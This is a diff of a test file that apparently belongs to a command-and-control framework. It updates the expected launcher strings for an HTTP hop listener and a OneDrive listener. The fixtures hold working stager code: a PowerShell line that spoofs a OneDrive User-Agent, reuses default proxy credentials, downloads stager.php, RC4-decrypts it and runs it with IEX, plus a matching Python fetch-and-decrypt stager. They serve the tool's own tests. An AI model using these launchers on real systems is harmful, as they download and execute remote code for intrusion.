@@ -459,12 +459,15 @@ def _expected_http_foreign_python_launcher():
 def _expected_http_hop_python_launcher():
     return dedent(
         """
-        import sys;o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost';t='/admin/get.php';import urllib2
-        proxy = urllib2.ProxyHandler();
-        o = urllib2.build_opener(proxy);
+        import sys;
+        import urllib.request;
+        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost';t='/admin/get.php';hop='fake_listener';
+        req=urllib.request.Request(server+t);
+        proxy = urllib.request.ProxyHandler();
+        o = urllib.request.build_opener(proxy);
         o.addheaders=[('User-Agent',UA), ("Cookie", "session=cm91dGluZyBwYWNrZXQ=")];
-        urllib2.install_opener(o);
-        a=o.open(server+t).read();
+        urllib.request.install_opener(o);
+        a=urllib.request.urlopen(req).read();
         IV=a[0:4];
         data=a[4:];
         key=IV+''.encode('UTF-8');
@@ -531,7 +534,7 @@ def _expected_onedrive_python_launcher():
 
 
 def _expected_onedrive_powershell_launcher():
-    return """$ErrorActionPreference = 'SilentlyContinue';$wc=New-Object System.Net.WebClient;$u='Microsoft SkyDriveSync 17.005.0107.0008 ship; Windows NT 10.0 (16299)';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$data=$wc.DownloadData('http://localhost/stager.php');$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""
+    return """$wc=New-Object System.Net.WebClient;$u='Microsoft SkyDriveSync 17.005.0107.0008 ship; Windows NT 10.0 (16299)';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$data=$wc.DownloadData('http://localhost/stager.php');$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""
 
 
 def _fake_malleable_profile():
